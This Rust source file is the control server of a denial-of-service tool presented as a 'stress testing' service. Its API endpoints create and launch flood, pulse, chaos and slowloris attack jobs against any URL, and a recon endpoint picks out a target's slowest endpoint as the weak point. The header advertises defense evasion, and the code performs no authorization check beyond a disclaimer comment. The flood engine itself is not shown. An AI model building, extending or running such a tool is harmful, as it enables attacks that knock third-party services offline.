//! Stress Testing API Service
//!
//! Professional network stress testing and DDoS simulation service.
//! Features:
//! - Smart endpoint targeting (latency analysis)
//! - Multiple attack modes (HTTP Flood, Pulse, Chaos)
//! - Real-time WebSocket metrics
//! - Wave modulation for defense evasion
//!
//! ⚠️ FOR AUTHORIZED SECURITY TESTING ONLY

mod attack;

use axum::{
    extract::{Path, State, WebSocketUpgrade, ws::{Message, WebSocket}},
    routing::{get, post, delete},
    Json, Router,
    response::IntoResponse,
};
use serde::{Deserialize, Serialize};
use std::{
    collections::HashMap,
    net::SocketAddr,
    sync::Arc,
    time::Duration,
};
use parking_lot::RwLock;
use tower_http::{cors::{Any, CorsLayer}, trace::TraceLayer};
use uuid::Uuid;
use tokio::sync::broadcast;
use futures::StreamExt;

use crate::attack::{AttackConfig, AttackMode, AttackEngine, AttackMetrics};

// ============================================================================
// Application State
// ============================================================================

type SharedState = Arc<AppState>;

pub struct AppState {
    jobs: RwLock<HashMap<String, StressJob>>,
    metrics_tx: broadcast::Sender<MetricsUpdate>,
}

#[derive(Clone, Serialize)]
pub struct StressJob {
    pub id: String,
    pub state: JobState,
    pub config: AttackConfig,
    pub metrics: AttackMetrics,
    pub logs: Vec<String>,
    pub created_at: i64,
    pub started_at: Option<i64>,
    pub completed_at: Option<i64>,
}

#[derive(Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum JobState {
    Pending,
    Recon,      // Smart targeting phase
    Armed,      // Ready to launch
    Running,
    Paused,
    Completed,
    Failed,
    Cancelled,
}

#[derive(Clone, Serialize)]
pub struct MetricsUpdate {
    pub job_id: String,
    pub metrics: AttackMetrics,
    pub timestamp: i64,
}

// ============================================================================
// API Request/Response Types
// ============================================================================

#[derive(Deserialize)]
struct CreateAttackRequest {
    target_url: String,
    #[serde(default)]
    mode: String,           // smart, pulse, chaos, manual
    #[serde(default = "default_rps")]
    rps: u32,               // Requests per second
    #[serde(default = "default_threads")]
    threads: u32,
    #[serde(default = "default_duration")]
    duration_secs: u32,
    #[serde(default)]
    custom_headers: HashMap<String, String>,
    #[serde(default)]
    request_body: Option<String>,
    #[serde(default)]
    http_method: Option<String>,
}

fn default_rps() -> u32 { 100 }
fn default_threads() -> u32 { 10 }
fn default_duration() -> u32 { 60 }

#[derive(Serialize)]
struct CreateAttackResponse {
    job_id: String,
    message: String,
}

#[derive(Deserialize)]
struct ReconRequest {
    target_url: String,
    #[serde(default = "default_max_endpoints")]
    max_endpoints: u32,
}

fn default_max_endpoints() -> u32 { 50 }

#[derive(Serialize)]
struct ReconResponse {
    endpoints: Vec<EndpointInfo>,
    recommended_target: Option<EndpointInfo>,
}

#[derive(Clone, Serialize)]
pub struct EndpointInfo {
    pub url: String,
    pub method: String,
    pub latency_ms: u64,
    pub status_code: u16,
    pub content_length: u64,
    pub is_slow: bool,
}

// ============================================================================
// Main Entry Point
// ============================================================================

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt::init();
    
    tracing::info!("⚡ Starting Stress Testing Service...");
    
    let (metrics_tx, _) = broadcast::channel::<MetricsUpdate>(1000);
    
    let shared_state = Arc::new(AppState {
        jobs: RwLock::new(HashMap::new()),
        metrics_tx,
    });
    
    let cors = CorsLayer::new()
        .allow_origin(Any)
        .allow_methods(Any)
        .allow_headers(Any);
    
    let app = Router::new()
        // Attack endpoints
        .route("/attack", post(create_attack))
        .route("/attack/:id", get(get_attack_status))
        .route("/attack/:id", delete(cancel_attack))
        .route("/attack/:id/launch", post(launch_attack))
        .route("/attack/:id/pause", post(pause_attack))
        .route("/attack/:id/resume", post(resume_attack))
        
        // WebSocket for real-time metrics
        .route("/attack/:id/ws", get(ws_handler))
        
        // Recon endpoint (smart targeting)
        .route("/recon", post(recon_endpoint))
        
        // Health check
        .route("/health", get(health_check))
        
        .layer(cors)
        .layer(TraceLayer::new_for_http())
        .with_state(shared_state);
    
    let addr = SocketAddr::from(([0, 0, 0, 0], 8012));
    tracing::info!("🌐 Listening on {}", addr);
    
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

// ============================================================================
// API Handlers
// ============================================================================

/// Health check endpoint
async fn health_check() -> Json<serde_json::Value> {
    Json(serde_json::json!({
        "status": "healthy",
        "service": "stress-service",
        "version": "1.0.0",
        "codename": "stress-service"
    }))
}

/// Create a new attack job (in RECON/ARMED state)
async fn create_attack(
    State(state): State<SharedState>,
    Json(payload): Json<CreateAttackRequest>,
) -> Json<CreateAttackResponse> {
    let job_id = Uuid::new_v4().to_string();
    
    let mode = match payload.mode.to_lowercase().as_str() {
        "smart" => AttackMode::Smart,
        "pulse" => AttackMode::Pulse,
        "chaos" => AttackMode::Chaos,
        "flood" => AttackMode::Flood,
        "slowloris" => AttackMode::Slowloris,
        _ => AttackMode::Manual,
    };
    
    let config = AttackConfig {
        target_url: payload.target_url.clone(),
        mode,
        rps: payload.rps,
        threads: payload.threads,
        duration_secs: payload.duration_secs,
        custom_headers: payload.custom_headers,
        request_body: payload.request_body,
        http_method: payload.http_method.unwrap_or_else(|| "GET".to_string()),
    };
    
    let now = chrono::Utc::now().timestamp();
    
    let job = StressJob {
        id: job_id.clone(),
        state: JobState::Armed,
        config,
        metrics: AttackMetrics::default(),
        logs: vec![
            format!("⚙️ Job created: {}", job_id),
            format!("🎯 Target: {}", payload.target_url),
            format!("⚡ Mode: {:?}, RPS: {}", mode, payload.rps),
        ],
        created_at: now,
        started_at: None,
        completed_at: None,
    };
    
    {
        let mut jobs = state.jobs.write();
        jobs.insert(job_id.clone(), job);
    }
    
    tracing::info!("📋 Created attack job {} targeting {}", job_id, payload.target_url);
    
    Json(CreateAttackResponse {
        job_id,
        message: "Attack job created. Use /attack/{id}/launch to start.".to_string(),
    })
}

/// Get attack job status
async fn get_attack_status(
    State(state): State<SharedState>,
    Path(id): Path<String>,
) -> impl IntoResponse {
    let jobs = state.jobs.read();
    match jobs.get(&id) {
        Some(job) => Json(serde_json::json!({
            "success": true,
            "job": job
        })),
        None => Json(serde_json::json!({
            "success": false,
            "error": "Job not found"
        })),
    }
}

/// Launch an armed attack
async fn launch_attack(
    State(state): State<SharedState>,
    Path(id): Path<String>,
) -> Json<serde_json::Value> {
    let config;
    let metrics_tx;
    
    {
        let mut jobs = state.jobs.write();
        if let Some(job) = jobs.get_mut(&id) {
            if job.state != JobState::Armed && job.state != JobState::Paused {
                return Json(serde_json::json!({
                    "success": false,
                    "error": "Job is not in launchable state"
                }));
            }
            
            job.state = JobState::Running;
            job.started_at = Some(chrono::Utc::now().timestamp());
            job.logs.push("🚀 ATTACK LAUNCHED".to_string());
            config = job.config.clone();
            metrics_tx = state.metrics_tx.clone();
        } else {
            return Json(serde_json::json!({
                "success": false,
                "error": "Job not found"
            }));
        }
    }
    
    // Spawn attack task
    let state_clone = state.clone();
    let job_id = id.clone();
    
    tokio::spawn(async move {
        run_attack_job(state_clone, job_id, config, metrics_tx).await;
    });
    
    Json(serde_json::json!({
        "success": true,
        "message": "Attack launched"
    }))
}

/// Pause a running attack
async fn pause_attack(
    State(state): State<SharedState>,
    Path(id): Path<String>,
) -> Json<serde_json::Value> {
    let mut jobs = state.jobs.write();
    
    if let Some(job) = jobs.get_mut(&id) {
        if job.state == JobState::Running {
            job.state = JobState::Paused;
            job.logs.push("⏸️ Attack paused".to_string());
            return Json(serde_json::json!({
                "success": true,
                "message": "Attack paused"
            }));
        }
    }
    
    Json(serde_json::json!({
        "success": false,
        "error": "Job not found or not running"
    }))
}

/// Resume a paused attack
async fn resume_attack(
    State(state): State<SharedState>,
    Path(id): Path<String>,
) -> Json<serde_json::Value> {
    launch_attack(State(state), Path(id)).await
}

/// Cancel an attack
async fn cancel_attack(
    State(state): State<SharedState>,
    Path(id): Path<String>,
) -> Json<serde_json::Value> {
    let mut jobs = state.jobs.write();
    
    if let Some(job) = jobs.get_mut(&id) {
        if job.state == JobState::Running || job.state == JobState::Paused || job.state == JobState::Armed {
            job.state = JobState::Cancelled;
            job.completed_at = Some(chrono::Utc::now().timestamp());
            job.logs.push("⛔ Attack cancelled by user".to_string());
            return Json(serde_json::json!({
                "success": true,
                "message": "Attack cancelled"
            }));
        }
    }
    
    Json(serde_json::json!({
        "success": false,
        "error": "Job not found or already completed"
    }))
}

/// WebSocket handler for real-time metrics
async fn ws_handler(
    State(state): State<SharedState>,
    Path(id): Path<String>,
    ws: WebSocketUpgrade,
) -> impl IntoResponse {
    let mut rx = state.metrics_tx.subscribe();
    
    ws.on_upgrade(move |socket| async move {
        handle_websocket(socket, id, rx).await;
    })
}

async fn handle_websocket(
    mut socket: WebSocket,
    job_id: String,
    mut rx: broadcast::Receiver<MetricsUpdate>,
) {
    while let Ok(update) = rx.recv().await {
        if update.job_id == job_id {
            let msg = serde_json::to_string(&update).unwrap_or_default();
            if socket.send(Message::Text(msg.into())).await.is_err() {
                break;
            }
        }
    }
}

/// Recon endpoint - analyze target for weak points
async fn recon_endpoint(
    Json(payload): Json<ReconRequest>,
) -> Json<ReconResponse> {
    tracing::info!("🔍 Starting recon for {}", payload.target_url);
    
    let endpoints = attack::recon::analyze_target(&payload.target_url, payload.max_endpoints).await;
    
    // Find the slowest endpoint (most resource-intensive)
    let recommended = endpoints.iter()
        .filter(|e| e.is_slow)
        .max_by_key(|e| e.latency_ms)
        .cloned();
    
    Json(ReconResponse {
        endpoints,
        recommended_target: recommended,
    })
}

// ============================================================================
// Background Attack Runner
// ============================================================================

async fn run_attack_job(
    state: SharedState,
    job_id: String,
    config: AttackConfig,
    metrics_tx: broadcast::Sender<MetricsUpdate>,
) {
    tracing::info!("⚡ Starting attack job {}", job_id);
    
    let engine = AttackEngine::new(config.clone());
    let start_time = std::time::Instant::now();
    let duration = Duration::from_secs(config.duration_secs as u64);
    
    // Metrics update interval
    let mut interval = tokio::time::interval(Duration::from_millis(100));
    
    loop {
        interval.tick().await;
        
        // Check job state
        {
            let jobs = state.jobs.read();
            if let Some(job) = jobs.get(&job_id) {
                match job.state {
                    JobState::Cancelled | JobState::Failed | JobState::Completed => {
                        break;
                    }
                    JobState::Paused => {
                        continue;
                    }
                    _ => {}
                }
            } else {
                break;
            }
        }
        
        // Check duration
        if start_time.elapsed() >= duration {
            let mut jobs = state.jobs.write();
            if let Some(job) = jobs.get_mut(&job_id) {
                job.state = JobState::Completed;
                job.completed_at = Some(chrono::Utc::now().timestamp());
                job.logs.push("✅ Attack completed".to_string());
            }
            break;
        }
        
        // Execute attack wave based on mode
        let metrics = engine.execute_wave().await;
        
        // Update job metrics
        {
            let mut jobs = state.jobs.write();
            if let Some(job) = jobs.get_mut(&job_id) {
                job.metrics = metrics.clone();
            }
        }
        
        // Broadcast metrics via WebSocket
        let _ = metrics_tx.send(MetricsUpdate {
            job_id: job_id.clone(),
            metrics,
            timestamp: chrono::Utc::now().timestamp_millis(),
        });
    }
    
    tracing::info!("✅ Attack job {} finished", job_id);
}
